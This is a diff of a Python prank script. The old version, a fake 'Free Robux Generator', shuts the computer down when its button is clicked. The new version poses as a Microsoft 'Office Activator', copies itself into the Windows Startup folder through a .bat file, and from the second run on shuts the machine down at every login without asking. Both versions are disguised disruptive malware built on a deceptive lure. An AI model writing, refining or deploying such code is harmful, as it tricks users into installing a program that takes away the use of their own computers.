@@ -1,61 +1,52 @@
+import os
 import tkinter as tk
 from tkinter import messagebox
-import os
-import platform
-import time
+import subprocess
+import shutil
+import sys
+
+# Flag failas
+flag_file = os.path.expanduser("~/.prank_ran")
+
+# Startup katalogas
+startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+bat_file_name = "PrankActivator.bat"
+bat_file_path = os.path.join(startup_folder, bat_file_name)
+
+def ask_shutdown_permission():
+    win = tk.Tk()
+    win.withdraw()
+    result = messagebox.askyesno("Office Activator", " \n\nAr norite aktyvuoti visus Microsoft produktus?")
+    win.destroy()
+    return result
 
 def shutdown_computer():
-    # Показываем "поддельное" сообщение
-    messagebox.showinfo("Bobux Claimed", "✅ Congratulations! You've claimed 10000 free robux!")
-    
-    # Задержка перед выключением (3 секунды)
-    time.sleep(3)
-    
-    # Выключаем компьютер в зависимости от ОС
-    system = platform.system()
     try:
-        if system == "Windows":
-            os.system("shutdown /s /t 1")
-        elif system == "Linux" or system == "Darwin":
-            os.system("shutdown -h now")
-        else:
-            messagebox.showerror("Error", "Unsupported operating system")
+        subprocess.run(["shutdown", "/s", "/t", "5"], check=True)
     except Exception as e:
-        messagebox.showerror("Error", f"Failed to shutdown: {str(e)}")
+        print("Nepavyko išjungti kompiuterio:", e)
 
-# Создаем главное окно
-root = tk.Tk()
-root.title("Free Robux Generator")
-root.geometry("300x300")
-root.resizable(False, False)
-root.configure(bg="#1e1e1e")
+def add_to_startup():
+    exe_path = os.path.abspath(sys.argv[0])
+    bat_content = f'"{exe_path}"'
+    try:
+        with open(bat_file_path, "w") as f:
+            f.write(bat_content)
+        print(f"Startup pridėta: {bat_file_path}")
+    except Exception as e:
+        print("Nepavyko pridėti į startup:", e)
 
-# Добавляем надпись
-label = tk.Label(
-    root, 
-    text="Free Robux", 
-    font=("Arial", 35, "bold"), 
-    bg="#1e1e1e",
-    fg="#ffffff"
-)
-label.pack(pady=40)
+def main():
+    if not os.path.exists(flag_file):
+        add_to_startup()
 
-# Добавляем кнопку
-claim_button = tk.Button(
-    root, 
-    text="CLAIM", 
-    command=shutdown_computer,  # Теперь вызывает выключение
-    bg="#4CAF50",
-    fg="white", 
-    font=("Arial", 23, "bold"),
-    padx=50,
-    pady=15,
-    borderwidth=0,
-    relief="flat",
-    activebackground="#257529",
-    activeforeground="white"
-)
-claim_button.pack()
+        if ask_shutdown_permission():
+            shutdown_computer()
 
-# Запускаем главный цикл
-root.mainloop()
+        with open(flag_file, "w") as f:
+            f.write("Paleista")
+    else:
+        shutdown_computer()
+
+if __name__ == "__main__":
+    main()
